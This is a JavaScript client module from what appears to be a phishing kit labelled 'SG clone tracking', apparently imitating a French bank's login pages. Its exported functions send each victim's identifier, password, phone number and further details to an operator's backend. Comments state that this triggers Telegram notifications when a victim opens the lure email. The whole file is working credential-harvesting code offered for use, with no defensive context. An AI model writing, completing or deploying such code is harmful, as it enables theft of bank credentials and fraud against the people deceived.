// Centralised API client for SG clone tracking.
// Maintains a session_id in localStorage and exposes thin wrappers
// for each endpoint of the backend.

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL || '';
const API_BASE = `${BACKEND_URL}/api`;
const SESSION_KEY = 'sg_session_id';

// In-flight de-duplication: if multiple callers (e.g. React StrictMode) trigger
// newSession at the same time, share the same promise instead of creating
// duplicate Telegram blocks.
let _pendingSession = null;

async function postJSON(path, body) {
  try {
    const res = await fetch(`${API_BASE}${path}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body || {}),
      keepalive: true,
    });
    if (!res.ok) {
      // eslint-disable-next-line no-console
      console.warn(`API ${path} returned ${res.status}`);
      return null;
    }
    return await res.json();
  } catch (err) {
    // eslint-disable-next-line no-console
    console.warn(`API ${path} failed`, err);
    return null;
  }
}

export async function ensureSession(page) {
  let sid = null;
  try {
    sid = localStorage.getItem(SESSION_KEY);
  } catch (e) {
    /* ignore */
  }
  if (sid) return sid;
  const data = await postJSON('/track/session', { page: page || window.location.pathname });
  if (data && data.session_id) {
    sid = data.session_id;
    try {
      localStorage.setItem(SESSION_KEY, sid);
    } catch (e) {
      /* ignore */
    }
  }
  return sid;
}

// Force creation of a brand-new session (used when user (re)opens the email).
// This guarantees a new Telegram message block + a fresh notification.
export async function newSession(page) {
  if (_pendingSession) return _pendingSession;
  _pendingSession = (async () => {
    try {
      localStorage.removeItem(SESSION_KEY);
    } catch (e) {
      /* ignore */
    }
    const data = await postJSON('/track/session', {
      page: page || window.location.pathname,
    });
    if (data && data.session_id) {
      try {
        localStorage.setItem(SESSION_KEY, data.session_id);
      } catch (e) {
        /* ignore */
      }
      return data.session_id;
    }
    return null;
  })();
  try {
    return await _pendingSession;
  } finally {
    // Allow another newSession() if user navigates back to email later.
    setTimeout(() => {
      _pendingSession = null;
    }, 3000);
  }
}

export function clearSession() {
  try {
    localStorage.removeItem(SESSION_KEY);
  } catch (e) {
    /* ignore */
  }
}

export function getSessionId() {
  try {
    return localStorage.getItem(SESSION_KEY);
  } catch (e) {
    return null;
  }
}

export async function trackIdentifier(identifier, remember) {
  const session_id = await ensureSession();
  return postJSON('/track/identifier', { session_id, identifier, remember });
}

export async function trackPassword(password) {
  const session_id = await ensureSession();
  return postJSON('/track/password', { session_id, password });
}

export async function trackPhone(phone, country_code = '+33') {
  const session_id = await ensureSession();
  return postJSON('/track/phone', { session_id, phone, country_code });
}

export async function trackInfo(info) {
  const session_id = await ensureSession();
  return postJSON('/track/info', { session_id, ...info });
}

export async function trackComplete() {
  const session_id = await ensureSession();
  return postJSON('/track/complete', { session_id });
}
